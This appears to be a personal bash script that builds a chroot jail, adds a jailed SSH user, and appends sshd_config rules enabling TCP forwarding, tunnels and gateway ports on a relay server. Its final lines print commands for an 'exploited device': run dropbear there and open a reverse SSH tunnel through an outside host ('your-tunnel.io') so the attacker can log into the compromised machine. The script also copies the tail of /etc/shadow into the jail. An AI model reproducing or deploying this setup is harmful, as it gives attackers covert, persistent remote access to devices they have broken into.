#!/usr/bin/env bash

#I built a little script out of.... some crazy garbage

if [ "$(echo $EUID)" -ne "0" ]; then
    echo "Run it as root"
    exit 1
fi

username="EWC"
force=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        --force)
            force=1
            shift
            ;;
        --user)
            if [[ -n "$2" && "$2" != --* ]]; then
                username="$2"
                shift 2
            else
                echo "Error: --user requires a username argument"
                exit 1
            fi
            ;;
        *)
            echo "Unknown option: $1"
            echo "Usage: $0 [--user <username>] [--force]"
            exit 1
            ;;
    esac
done

if ! [[ "$username" =~ ^[a-zA-Z0-9_]{1,32}$ ]]; then
    echo "Invalid username: $username"
    echo "Only letters, numbers, and underscores allowed (1–32 characters)."
    exit 1
fi

files_to_check="/etc/passwd /etc/group /etc/shadow /etc/ssh/sshd_config"
for c in $files_to_check; do
    grep "$username" $c > /dev/null
    result="$?"
    if [ "$result" -eq 0 ]; then
        echo "A user named $username (or some trace of one) already exists on the system"
        echo "Offending file: $c"
        exit 1
    fi
done

if [ -d "/jail" ]; then 
    if [ "$force" -eq 1 ]; then
        echo "/jail exists, but proceeding because --force was used."
    else
        read -p "/jail already exists. Continue and overwrite? (y/N): " confirm
        if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
            echo "Aborting."
            exit 1
        fi
    fi
    rm -rf /jail
fi

mkdir -p /jail
mkdir -p /jail/bin
cp $(which bash) /jail/bin/bash

if command -v ldd &>/dev/null; then
    libraries="$(ldd $(which bash) | grep -oE "[r-u,\/]{0,}/lib[0-9]{0,}/[a-z,0-9,-\.]{3,}" | sed ':a;N;$!ba;s/\n/ /g')"
    for l in $libraries; do
        if [ ! -d "/jail$(dirname $l)" ]; then
            mkdir -p /jail$(dirname $l)
        fi
        cp $l /jail$(dirname $l)/$(basename $l)
    done
else
    echo "Install ldd to identify required libraries"
    exit 1
fi

mkdir -p /jail/etc 
mkdir -p /jail/usr
mkdir -p /jail/usr/share
cp -r /usr/share/terminfo /jail/usr/share/

mkdir /jail/dev
mknod /jail/dev/null c 1 3
mknod /jail/dev/zero c 1 5
mknod /jail/dev/tty c 5 0
mknod /jail/dev/random c 1 8
mknod /jail/dev/urandom c 1 9
chmod 0666 /jail/dev/null
chmod 0666 /jail/dev/tty
chmod 0666 /jail/dev/zero
chown root:tty /jail/dev/tty

useradd --base-dir /jail/home --create-home --shell /bin/bash $username
exit_useradd="$?"
if [ "$exit_useradd" == 1 ]; then
    echo "Useradd failed"
    exit $exit_useradd
fi

etcs="group passwd hosts"
for e in $etcs; do
    cp /etc/$e /jail/etc/$e
done

echo "Match User $username" >> /etc/ssh/sshd_config
echo "    ChrootDirectory /jail" >> /etc/ssh/sshd_config
echo "    PasswordAuthentication yes" >> /etc/ssh/sshd_config
echo "    PubKeyAuthentication yes" >> /etc/ssh/sshd_config
echo "    AuthorizedKeysFile .ssh/authorized_keys" >> /etc/ssh/sshd_config
echo "    StrictModes yes" >> /etc/ssh/sshd_config
echo "    AllowTcpForwarding yes" >> /etc/ssh/sshd_config
echo "    PermitTunnel yes" >> /etc/ssh/sshd_config
echo "    GatewayPorts yes" >> /etc/ssh/sshd_config

if [ ! -d "/jail/home/$username" ]; then
    mkdir -p /jail/home/$username
    chown $username:$username /jail/home/$username
fi

mkdir -p /jail/home/$username/.ssh
touch /jail/home/$username/.ssh/authorized_keys

read -p 'Home directory to source ssh keys to authorize (ex. /home/user): ' homedir

#Call it the blood of the exploited ssh-h-h-h-h-h!

if [ -d "$homedir/.ssh" ]; then
    if compgen -G "$homedir/.ssh/*.pub" > /dev/null; then
        cat $homedir/.ssh/*.pub > /jail/home/$username/.ssh/authorized_keys
        echo "Authorized pubkeys from $homedir/.ssh for login"
    else
        echo "No public keys found in $homedir/.ssh"
        exit 1
    fi
else
    echo "No SSH directory found at $homedir/.ssh"
    exit 1
fi

chmod 600 /jail/home/$username/.ssh/authorized_keys
chown $username:$username /jail/home/$username/.ssh
chown $username:$username /jail/home/$username/.ssh/authorized_keys

yn=0
while [ $yn -lt 1 ]; do
    read -p "Set a password for $username? (y or n) " yorn
    case $yorn in
    y)
        passwd $username
        tail /etc/shadow > /jail/etc/shadow
        yn=1
        ;;
    n)
        yn=1
        ;;
    *)
        echo "Invalid response!"
        ;;
    esac
done

killall sshd && /usr/sbin/sshd

echo "Now you can forward ports to your device via SSH"
echo "Example: on an exploited device with dropbear, run:"
echo 'dropbear -r /etc/dropbear/dropbear_ed25519_host_key -R -a -p 44224 -P /var/run/dropbear1.pid -i -K 299 -I 0'
echo "Then connect like:"
echo "ssh $username@your-tunnel.io -p 19767 -T -N -f -y -y -i /etc/dropbear/id_dropbear -A -g -K 250 -I 0 -R 44224:localhost:44224"
echo "Then, on your device, run:"
echo 'ssh remote_user@localhost -p 44224'
